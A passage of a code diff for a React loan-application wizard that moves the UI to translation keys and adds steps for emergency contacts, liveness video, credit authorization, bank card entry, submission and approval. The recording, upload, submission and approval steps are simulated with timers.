-                onChange={(e) => setPhone(e.target.value)}
-                className="flex-1 px-4 py-3 border border-slate-300 rounded-sm text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
-                placeholder="Ingresa tu número de teléfono"
+                value={contact1Phone}
+                onChange={(e) => setContact1Phone(e.target.value)}
+                placeholder={t('loanWizard.step4.contactPhonePlaceholder')}
+                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                maxLength={11}
+                style={{ maxWidth: "100%" }}
               />
             </div>
           </div>
-
-          {/* 注册成功提示 */}
-          {registrationSuccess && (
-            <div className="flex items-center space-x-3 p-4 bg-green-50 border border-green-200 rounded-lg">
-              <svg className="w-5 h-5 text-green-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
-                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
-              </svg>
-              <span className="text-sm font-medium text-green-800">Usuario registrado exitosamente</span>
-            </div>
-          )}
-
-          {/* 主要按钮 */}
-          <div className="pt-4">
-            <button
-              onClick={handleCheckEligibility}
-              disabled={!phone.trim() || isRegistering}
-              className="w-full px-6 py-4 bg-slate-800 hover:bg-slate-700 disabled:bg-slate-400 text-white font-semibold rounded-sm transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif]"
-            >
-              {isRegistering ? (
-                <div className="flex items-center justify-center space-x-3">
-                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                  <span>Reclamando tu límite...</span>
-                </div>
-              ) : (
-                'Reclamar Mi Límite de Crédito'
-              )}
-            </button>
-          </div>
-
-          {/* 信任指标 */}
-          <div className="grid grid-cols-3 gap-2 sm:gap-4 pt-6 border-t border-slate-200">
-            <div className="text-center">
-              <div className="text-lg sm:text-2xl font-bold text-slate-900 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">2min</div>
-              <div className="text-xs text-slate-600 mt-1">Aprobación</div>
-            </div>
-            <div className="text-center">
-              <div className="text-lg sm:text-2xl font-bold text-slate-900 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">0%</div>
-              <div className="text-xs text-slate-600 mt-1">Comisión</div>
-            </div>
-            <div className="text-center">
-              <div className="text-lg sm:text-2xl font-bold text-slate-900 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">24/7</div>
-              <div className="text-xs text-slate-600 mt-1">Soporte</div>
-            </div>
-          </div>
         </div>
-      ) : (
-        <div className="space-y-6">
-          {/* 预批准金额显示 */}
-          <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-lg p-6 text-center">
-            <div className="mb-4">
-              <svg className="w-16 h-16 text-green-600 mx-auto" fill="currentColor" viewBox="0 0 20 20">
-                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
-              </svg>
-            </div>
-            <h3 className="text-2xl font-bold text-green-800 mb-2 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-              ¡Felicidades!
-            </h3>
-            <p className="text-green-700 mb-4">Has sido pre-aprobado para un préstamo de hasta:</p>
-            <div className="text-3xl font-bold text-green-800 mb-4 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
-              $50,000 MXN
-            </div>
-            <div className="bg-white rounded-lg p-4 text-left space-y-3">
-              <div className="flex justify-between text-sm">
-                <span className="text-slate-600">Tasa de interés:</span>
-                <span className="font-semibold text-slate-800">Desde 12% anual</span>
-              </div>
-              <div className="flex justify-between text-sm">
-                <span className="text-slate-600">Plazo:</span>
-                <span className="font-semibold text-slate-800">6 a 36 meses</span>
-              </div>
-              <div className="flex justify-between text-sm">
-                <span className="text-slate-600">Sin comisiones:</span>
-                <span className="font-semibold text-green-700">✓ Apertura gratuita</span>
-              </div>
-            </div>
-          </div>
 
-          {/* 继续按钮 */}
-          <button
-            onClick={onNext}
-            className="w-full px-6 py-4 bg-slate-800 hover:bg-slate-700 text-white font-semibold rounded-sm transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif]"
-          >
-            Continuar con mi Solicitud
-          </button>
-        </div>
-      )}
-    </div>
-  );
-};
-
-// 第2步：个人信息
-const Step2PersonalInfo: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack }) => {
-  const { t } = useTranslation();
-
-  return (
-    <div className="p-6 lg:p-8">
-      {/* 步骤标题 */}
-      <div className="mb-8">
-        <div className="flex items-center space-x-4 mb-6">
-          <div className="w-12 h-12 bg-slate-800 rounded-lg flex items-center justify-center shadow-sm">
-            <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
-              <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
-            </svg>
-          </div>
-          <div>
-            <h2 className="text-xl font-bold text-slate-900 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-              Información Personal
-            </h2>
-            <p className="text-sm text-slate-600 mt-1">
-              Completa tus datos personales para continuar
-            </p>
-          </div>
-        </div>
-        
-        {/* 安全提示 */}
-        <div className="flex items-start space-x-3 p-4 bg-slate-50 border border-slate-200 rounded-lg">
-          <svg className="w-5 h-5 text-slate-600 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
-            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
-          </svg>
-          <div>
-            <p className="text-sm font-semibold text-slate-700">Información protegida</p>
-            <p className="text-xs text-slate-600 mt-1">Todos tus datos están encriptados y seguros</p>
+        <div className="border rounded-lg p-3 sm:p-4">
+          <h4 className="font-semibold mb-3 sm:mb-4">{t('loanWizard.step4.contact2Title')}</h4>
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4">
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-2">
+                {t('loanWizard.step4.contactNameLabel')}
+              </label>
+              <input
+                type="text"
+                value={contact2Name}
+                onChange={(e) => setContact2Name(e.target.value)}
+                placeholder={t('loanWizard.step4.contactNamePlaceholder')}
+                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                style={{ maxWidth: "100%" }}
+              />
+            </div>
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-2">
+                {t('loanWizard.step4.contactPhoneLabel')}
+              </label>
+              <input
+                type="tel"
+                value={contact2Phone}
+                onChange={(e) => setContact2Phone(e.target.value)}
+                placeholder={t('loanWizard.step4.contactPhonePlaceholder')}
+                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                maxLength={11}
+                style={{ maxWidth: "100%" }}
+              />
+            </div>
           </div>
         </div>
       </div>
 
-      {/* 表单区域 */}
-      <div className="space-y-6">
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-          <div className="space-y-2">
-            <label className="block text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
-              Nombre(s) <span className="text-red-500">*</span>
-            </label>
-            <input
-              type="text"
-              value={data.firstName || ''}
-              onChange={(e) => onUpdate({ firstName: e.target.value })}
-              className="w-full px-4 py-3 border border-slate-300 rounded-sm text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
-              placeholder="Ingresa tu nombre"
-            />
-          </div>
-
-          <div className="space-y-2">
-            <label className="block text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
-              Apellidos <span className="text-red-500">*</span>
-            </label>
-            <input
-              type="text"
-              value={data.lastName || ''}
-              onChange={(e) => onUpdate({ lastName: e.target.value })}
-              className="w-full px-4 py-3 border border-slate-300 rounded-sm text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
-              placeholder="Ingresa tus apellidos"
-            />
-          </div>
-
-          <div className="space-y-2">
-            <label className="block text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
-              Correo electrónico <span className="text-red-500">*</span>
-            </label>
-            <input
-              type="email"
-              value={data.email || ''}
-              onChange={(e) => onUpdate({ email: e.target.value })}
-              className="w-full px-4 py-3 border border-slate-300 rounded-sm text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
-              placeholder="ejemplo@correo.com"
-            />
-          </div>
-
-          <div className="space-y-2">
-            <label className="block text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
-              Fecha de nacimiento <span className="text-red-500">*</span>
-            </label>
-            <input
-              type="date"
-              value={data.birthDate || ''}
-              onChange={(e) => onUpdate({ birthDate: e.target.value })}
-              className="w-full px-4 py-3 border border-slate-300 rounded-sm text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
-            />
-          </div>
-        </div>
-      </div>
-
-      {/* 导航按钮 */}
-      <div className="flex flex-col sm:flex-row justify-between items-center pt-8 mt-8 border-t border-slate-200 space-y-4 sm:space-y-0 sm:space-x-4">
+      <div className="flex gap-3">
         <button
           onClick={onBack}
-          className="w-full sm:w-auto px-6 py-3 border border-slate-300 text-slate-700 font-semibold rounded-sm hover:bg-slate-50 transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif] flex items-center justify-center space-x-2"
+          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
         >
-          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
-            <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />
-          </svg>
-          <span>Anterior</span>
+          {t('loanWizard.step2.backButton')}
         </button>
-        
         <button
-          onClick={onNext}
-          disabled={!data.firstName || !data.lastName || !data.email || !data.birthDate}
-          className="w-full sm:w-auto px-6 py-3 bg-slate-800 hover:bg-slate-700 disabled:bg-slate-400 text-white font-semibold rounded-sm transition-colors duration-200 font-['Roboto','Helvetica_Neue',Arial,sans-serif] flex items-center justify-center space-x-2"
+          onClick={handleNext}
+          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
         >
-          <span>Siguiente</span>
-          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
-            <path fillRule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clipRule="evenodd" />
-          </svg>
+          {t('loanWizard.step2.nextButton')}
         </button>
       </div>
     </div>
   );
 };
 
-// 主向导组件 - 增强版
-const LoanWizardEnhanced: React.FC = () => {
+// 第5步：活体识别
+const Step5LivenessDetection: React.FC<StepProps> = ({ onNext, onBack, updateApplicationStep }) => {
   const { t } = useTranslation();
-  const [currentStep, setCurrentStep] = useState(1);
-  const [applicationData, setApplicationData] = useState<LoanApplication>({
-    step: 1,
-    isGuest: true
-  });
-  const totalSteps = 12;
+  const [videoUploaded, setVideoUploaded] = useState(false);
+  const [isRecording, setIsRecording] = useState(false);
+  const [isUploading, setIsUploading] = useState(false);
+  const [videoFileName, setVideoFileName] = useState('');
+  const [showVideoOptions, setShowVideoOptions] = useState(false);
 
-  // 初始化应用程序和跟踪
-  useEffect(() => {
-    const initializeApplication = async () => {
-      try {
-        // 检查浏览器兼容性
-        checkBrowserCompatibility();
-        
-        // 启动应用程序跟踪
-        trackLoanApplicationStart();
-        
-        // 生成会话ID和应用程序ID
-        const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-        const applicationId = `app_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-        
-        // 尝试从本地存储恢复数据
-        const savedData = safeStorage.getItem('loanApplication');
-        if (savedData) {
-          try {
-            const parsedData = JSON.parse(savedData);
-            // 如果没有ID，则生成新的ID
-            const finalData = {
-              ...parsedData,
-              sessionId,
-              id: parsedData.id || applicationId
-            };
-            setApplicationData(prev => ({ ...prev, ...finalData }));
-          } catch (error) {
-            console.warn('Failed to parse saved application data:', error);
-            setApplicationData(prev => ({ ...prev, sessionId, id: applicationId }));
-          }
-        } else {
-          setApplicationData(prev => ({ ...prev, sessionId, id: applicationId }));
-        }
-        
-        console.log('✅ Application initialized successfully');
-      } catch (error) {
-        console.error('❌ Failed to initialize application:', error);
+  const startRecording = () => {
+    setIsRecording(true);
+    // 模拟3秒录制
+    setTimeout(() => {
+      setIsRecording(false);
+      setVideoUploaded(true);
+      setVideoFileName('liveness_video_' + Date.now() + '.mp4');
+    }, 3000);
+  };
+
+  const handleVideoUpload = (file: File) => {
+    setIsUploading(true);
+    setVideoFileName(file.name);
+    // 模拟上传过程
+    setTimeout(() => {
+      setIsUploading(false);
+      setVideoUploaded(true);
+    }, 2000);
+  };
+
+  const handleVideoSelect = () => {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.accept = 'video/*';
+    input.onchange = (e) => {
+      const file = (e.target as HTMLInputElement).files?.[0];
+      if (file) {
+        handleVideoUpload(file);
       }
     };
+    input.click();
+  };
 
-    initializeApplication();
+  const handleNext = () => {
+    if (!videoUploaded) {
+      alert(t('errors.required'));
+      return;
+    }
+    const stepData = { videoUploaded, videoFileName };
+    if (updateApplicationStep) {
+      updateApplicationStep(5, stepData);
+    }
+    onNext();
+  };
+
+  return (
+    <div className="space-y-6">
+      <div>
+        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step5.title')}</h3>
+        <p className="text-gray-600">{t('loanWizard.step5.subtitle')}</p>
+      </div>
+
+      <div className="text-center">
+        <div className="inline-block p-8 border-2 border-dashed border-gray-300 rounded-lg bg-gray-50">
+          <div className="space-y-4">
+            <div className="text-6xl">📹</div>
+            <div>
+              <h4 className="font-medium mb-2">{t('loanWizard.step5.livenessTitle')}</h4>
+              <p className="text-sm text-gray-500 mb-4">
+                {t('loanWizard.step5.livenessDesc')}
+              </p>
+            </div>
+
+            {videoUploaded ? (
+              <div className="space-y-2">
+                <div className="text-green-600">✓ {videoFileName}</div>
+                <div className="text-xs text-gray-500">{t('loanWizard.step5.livenessComplete')}</div>
+              </div>
+            ) : isUploading ? (
+              <div className="space-y-2">
+                <div className="text-blue-600">{t('loanWizard.step5.uploading')}</div>
+                <div className="w-full bg-gray-200 rounded-full h-2">
+                  <div className="bg-blue-600 h-2 rounded-full animate-pulse" style={{ width: '70%' }}></div>
+                </div>
+              </div>
+            ) : isRecording ? (
+              <div className="space-y-2">
+                <div className="text-blue-600">{t('loanWizard.step5.recordingDesc')}</div>
+                <div className="w-full bg-gray-200 rounded-full h-2">
+                  <div className="bg-red-500 h-2 rounded-full animate-pulse" style={{ width: '100%' }}></div>
+                </div>
+              </div>
+            ) : !showVideoOptions ? (
+              <button
+                onClick={() => setShowVideoOptions(true)}
+                className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
+              >
+                {t('loanWizard.step5.startVerificationButton')}
+              </button>
+            ) : (
+              <div className="space-y-3">
+                <button
+                  onClick={startRecording}
+                  className="block w-full px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
+                >
+                  {t('loanWizard.step5.startRecordingButton')}
+                </button>
+                <div className="text-gray-500 text-sm">{t('loanWizard.step5.orText')}</div>
+                <button
+                  onClick={handleVideoSelect}
+                  className="block w-full px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700"
+                >
+                  {t('loanWizard.step5.uploadVideoButton')}
+                </button>
+              </div>
+            )}
+          </div>
+        </div>
+      </div>
+
+      <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
+        <h4 className="font-medium text-yellow-800 mb-2">{t('loanWizard.step5.recordingHintTitle')}</h4>
+        <ul className="text-sm text-yellow-700 space-y-1">
+          <li>• {t('loanWizard.step5.recordingHint1')}</li>
+          <li>• {t('loanWizard.step5.recordingHint2')}</li>
+          <li>• {t('loanWizard.step5.recordingHint3')}</li>
+          <li>• {t('loanWizard.step5.recordingHint4')}</li>
+        </ul>
+      </div>
+
+      <div className="flex gap-3">
+        <button
+          onClick={onBack}
+          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
+        >
+          {t('loanWizard.step2.backButton')}
+        </button>
+        <button
+          onClick={handleNext}
+          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
+        >
+          {t('loanWizard.step2.nextButton')}
+        </button>
+      </div>
+    </div>
+  );
+};
+
+// 第6步：征信授权
+const Step6CreditAuthorization: React.FC<StepProps> = ({ onNext, onBack, updateApplicationStep }) => {
+  const { t } = useTranslation();
+  const [hasRead, setHasRead] = useState(false);
+  const [agreed, setAgreed] = useState(false);
+
+  const handleScroll = (e: React.UIEvent<HTMLDivElement>) => {
+    const element = e.currentTarget;
+    // 使用更宽松的判断条件，允许1像素的误差
+    const bottom = element.scrollHeight - element.scrollTop <= element.clientHeight + 1;
+    if (bottom) {
+      setHasRead(true);
+    }
+  };
+
+  const handleNext = () => {
+    if (!agreed) {
+      alert(t('errors.required'));
+      return;
+    }
+    const stepData = { agreed, hasRead };
+    if (updateApplicationStep) {
+      updateApplicationStep(6, stepData);
+    }
+    onNext();
+  };
+
+  return (
+    <div className="space-y-6">
+      <div>
+        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step6.title')}</h3>
+        <p className="text-gray-600">{t('loanWizard.step6.subtitle')}</p>
+      </div>
+
+      <div className="border rounded-lg">
+        <div className="bg-gray-50 px-4 py-3 border-b">
+          <h4 className="font-semibold">{t('loanWizard.step6.creditAgreementTitle')}</h4>
+        </div>
+        <div
+          className="p-4 h-64 overflow-y-auto text-sm leading-relaxed"
+          onScroll={handleScroll}
+        >
+          <p className="mb-4">
+            <strong>{t('loanWizard.step6.agreementPurpose')}</strong><br />
+            {t('loanWizard.step6.agreementPurposeDesc')}
+          </p>
+          <p className="mb-4">
+            <strong>{t('loanWizard.step6.agreementScope')}</strong><br />
+            {t('loanWizard.step6.agreementScopeDesc')}
+          </p>
+          <p className="mb-4">
+            <strong>{t('loanWizard.step6.agreementPrivacy')}</strong><br />
+            {t('loanWizard.step6.agreementPrivacyDesc')}
+          </p>
+          <p className="mb-4">
+            <strong>{t('loanWizard.step6.agreementPeriod')}</strong><br />
+            {t('loanWizard.step6.agreementPeriodDesc')}
+          </p>
+          <p className="mb-4">
+            <strong>{t('loanWizard.step6.agreementOther')}</strong><br />
+            {t('loanWizard.step6.agreementOtherDesc')}
+          </p>
+          <p className="mb-4">
+            {t('loanWizard.step6.agreementExplanation')}
+          </p>
+          <div className="text-center py-4">
+            {hasRead ? (
+              <div className="text-green-600 font-medium">✓ 您已阅读完整协议</div>
+            ) : (
+              <div className="space-y-2">
+                <div className="text-gray-500">请滑动到底部阅读完整协议</div>
+                <button
+                  onClick={() => setHasRead(true)}
+                  className="text-blue-600 hover:text-blue-800 text-sm underline"
+                >
+                  我已阅读完整协议
+                </button>
+              </div>
+            )}
+          </div>
+        </div>
+      </div>
+
+      <div className="flex items-center space-x-3">
+        <input
+          type="checkbox"
+          id="credit-agreement"
+          checked={agreed}
+          onChange={(e) => setAgreed(e.target.checked)}
+          disabled={!hasRead}
+          className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
+        />
+        <label htmlFor="credit-agreement" className="text-sm text-gray-700">
+          {t('loanWizard.step6.creditAuthorizationLabel')}
+        </label>
+      </div>
+
+      <div className="flex gap-3">
+        <button
+          onClick={onBack}
+          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
+        >
+          {t('loanWizard.step2.backButton')}
+        </button>
+        <button
+          onClick={handleNext}
+          disabled={!agreed}
+          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
+        >
+          {t('loanWizard.step6.agreeAndContinueButton')}
+        </button>
+      </div>
+    </div>
+  );
+};
+
+// 第7步：银行卡信息
+const Step7BankCard: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack, updateApplicationStep }) => {
+  const { t } = useTranslation();
+  const [bankCardNumber, setBankCardNumber] = useState(data.bankCardNumber || '');
+
+  const formatCardNumber = (value: string) => {
+    // 移除所有非数字字符
+    const numbers = value.replace(/\D/g, '');
+    // 每4位添加一个空格
+    return numbers.replace(/(\d{4})/g, '$1 ').trim();
+  };
+
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const formatted = formatCardNumber(e.target.value);
+    setBankCardNumber(formatted);
+  };
+
+  const handleNext = () => {
+    const cleanCardNumber = bankCardNumber.replace(/\s/g, '');
+    if (!cleanCardNumber || cleanCardNumber.length < 16) {
+      alert(t('errors.invalid'));
+      return;
+    }
+    const stepData = { bankCardNumber: cleanCardNumber };
+    onUpdate(stepData);
+    if (updateApplicationStep) {
+      updateApplicationStep(7, stepData);
+    }
+    onNext();
+  };
+
+  return (
+    <div className="space-y-6">
+      <div>
+        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step7.title')}</h3>
+        <p className="text-gray-600">{t('loanWizard.step7.subtitle')}</p>
+      </div>
+
+      <div className="space-y-4">
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-2">
+            {t('loanWizard.step7.bankCardLabel')}
+          </label>
+          <input
+            type="text"
+            value={bankCardNumber}
+            onChange={handleCardNumberChange}
+            placeholder={t('loanWizard.step7.bankCardPlaceholder')}
+            className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base sm:text-lg tracking-wider"
+            maxLength={23} // 16位数字 + 3个空格
+            style={{ maxWidth: "100%" }}
+          />
+        </div>
+
+        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
+          <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step7.securityHintTitle')}</h4>
+          <ul className="text-sm text-blue-700 space-y-1">
+            <li>{t('loanWizard.step7.securityHint1')}</li>
+            <li>{t('loanWizard.step7.securityHint2')}</li>
+            <li>{t('loanWizard.step7.securityHint3')}</li>
+          </ul>
+        </div>
+      </div>
+
+      <div className="flex gap-3">
+        <button
+          onClick={onBack}
+          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
+        >
+          {t('loanWizard.step2.backButton')}
+        </button>
+        <button
+          onClick={handleNext}
+          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
+        >
+          {t('loanWizard.step2.nextButton')}
+        </button>
+      </div>
+    </div>
+  );
+};
+
+// 第8步：提交贷款申请
+const Step8SubmitApplication: React.FC<StepProps> = ({ data, onNext, onBack, updateApplicationStep }) => {
+  const { t } = useTranslation();
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
+  const handleSubmit = async () => {
+    setIsSubmitting(true);
+    try {
+      // 模拟提交过程
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      const stepData = { submitted: true, submittedAt: Date.now() };
+      if (updateApplicationStep) {
+        await updateApplicationStep(8, stepData);
+      }
+      onNext();
+    } catch (error) {
+      console.error('Submit failed:', error);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
+  return (
+    <div className="space-y-6">
+      <div>
+        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step8.title')}</h3>
+        <p className="text-gray-600">{t('loanWizard.step8.subtitle')}</p>
+      </div>
+
+      <div className="bg-gray-50 rounded-lg p-6">
+        <h4 className="font-semibold mb-4">{t('loanWizard.step8.applicationSummaryTitle')}</h4>
+        <div className="space-y-3 text-sm">
+          <div className="flex justify-between">
+            <span className="text-gray-600">{t('loanWizard.step8.phoneLabel')}:</span>
+            <span>{data.phone}</span>
+          </div>
+          <div className="flex justify-between">
+            <span className="text-gray-600">{t('loanWizard.step8.realNameLabel')}:</span>
+            <span>{data.realName}</span>
+          </div>
+          <div className="flex justify-between">
+            <span className="text-gray-600">{t('loanWizard.step8.idNumberLabel')}:</span>
+            <span>{data.idNumber}</span>
+          </div>
+          <div className="flex justify-between">
+            <span className="text-gray-600">{t('loanWizard.step8.contact1Label')}:</span>
+            <span>{data.contact1Name} ({data.contact1Phone})</span>
+          </div>
+          <div className="flex justify-between">
+            <span className="text-gray-600">{t('loanWizard.step8.contact2Label')}:</span>
+            <span>{data.contact2Name} ({data.contact2Phone})</span>
+          </div>
+          <div className="flex justify-between">
+            <span className="text-gray-600">{t('loanWizard.step8.bankCardLabel')}:</span>
+            <span>****{data.bankCardNumber?.slice(-4)}</span>
+          </div>
+        </div>
+      </div>
+
+      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
+        <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step8.importantHintTitle')}</h4>
+        <ul className="text-sm text-blue-700 space-y-1">
+          <li>{t('loanWizard.step8.importantHint1')}</li>
+          <li>{t('loanWizard.step8.importantHint2')}</li>
+          <li>{t('loanWizard.step8.importantHint3')}</li>
+          <li>{t('loanWizard.step8.importantHint4')}</li>
+        </ul>
+      </div>
+
+      <div className="flex gap-3">
+        <button
+          onClick={onBack}
+          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
+          disabled={isSubmitting}
+        >
+          {t('loanWizard.step2.backButton')}
+        </button>
+        <button
+          onClick={handleSubmit}
+          disabled={isSubmitting}
+          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50"
+        >
+          {isSubmitting ? t('loanWizard.step8.submittingText') : t('loanWizard.step8.submitApplicationButton')}
+        </button>
+      </div>
+    </div>
+  );
+};
+
+// 第9步：审批中
+const Step9Processing: React.FC<StepProps> = ({ onNext, updateApplicationStep }) => {
+  const { t } = useTranslation();
+  const [timeLeft, setTimeLeft] = useState(10);
+
+  useEffect(() => {
+    const timer = setInterval(() => {
+      setTimeLeft((prev) => {
+        if (prev <= 1) {
+          clearInterval(timer);
+          const stepData = { processed: true, processedAt: Date.now() };
+          if (updateApplicationStep) {
+            updateApplicationStep(9, stepData);
+          }
+          onNext();
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, [onNext, updateApplicationStep]);
+
+  return (
+    <div className="space-y-6 text-center">
+      <div>
+        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step9.title')}</h3>
+        <p className="text-gray-600">{t('loanWizard.step9.subtitle')}</p>
+      </div>
+
+      <div className="py-12">
+        <div className="w-16 h-16 mx-auto mb-6 relative">
+          <div className="absolute inset-0 border-4 border-blue-200 rounded-full"></div>
+          <div className="absolute inset-0 border-4 border-blue-600 rounded-full border-t-transparent animate-spin"></div>
+        </div>
+        <div className="text-lg font-medium text-blue-600 mb-2">
+          {t('loanWizard.step9.processingTitle')}
+        </div>
+        <div className="text-sm text-gray-500">
+          {t('loanWizard.step9.timeLeft', { time: timeLeft })}
+        </div>
+      </div>
+
+      <div className="bg-gray-50 rounded-lg p-6">
+        <h4 className="font-semibold mb-4">{t('loanWizard.step9.auditProcessTitle')}</h4>
+        <div className="space-y-3">
+          <div className="flex items-center space-x-3">
+            <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+              <span className="text-white text-xs">✓</span>
+            </div>
+            <span className="text-sm">{t('loanWizard.step9.identityVerification')}</span>
+          </div>
+          <div className="flex items-center space-x-3">
+            <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+              <span className="text-white text-xs">✓</span>
+            </div>
+            <span className="text-sm">{t('loanWizard.step9.creditAuthorization')}</span>
+          </div>
+          <div className="flex items-center space-x-3">
+            <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center animate-pulse">
+              <span className="text-white text-xs">?</span>
+            </div>
+            <span className="text-sm">{t('loanWizard.step9.riskControl')}</span>
+          </div>
+          <div className="flex items-center space-x-3">
+            <div className="w-6 h-6 bg-gray-300 rounded-full flex items-center justify-center">
+              <span className="text-white text-xs">-</span>
+            </div>
+            <span className="text-sm text-gray-400">{t('loanWizard.step9.finalApproval')}</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// 第10步：审批通过
+const Step10Approved: React.FC<StepProps> = ({ onNext, onBack, updateApplicationStep }) => {
+  const { t } = useTranslation();
+  const approvedAmount = 100000; // 模拟审批金额
+
+  return (
+    <div className="space-y-6 text-center">
+      <div>
+        <div className="w-20 h-20 mx-auto mb-4 bg-green-100 rounded-full flex items-center justify-center">
+          <span className="text-4xl">🎉</span>
+        </div>
+        <h3 className="text-2xl font-bold text-green-600 mb-2">{t('loanWizard.step10.congratulationsTitle')}</h3>
+        <p className="text-gray-600">{t('loanWizard.step10.approvedDesc')}</p>
+      </div>
+
+      <div className="bg-green-50 border border-green-200 rounded-lg p-6">
+        <h4 className="font-semibold text-green-800 mb-4">{t('loanWizard.step10.approvalResultTitle')}</h4>
+        <div className="space-y-2">
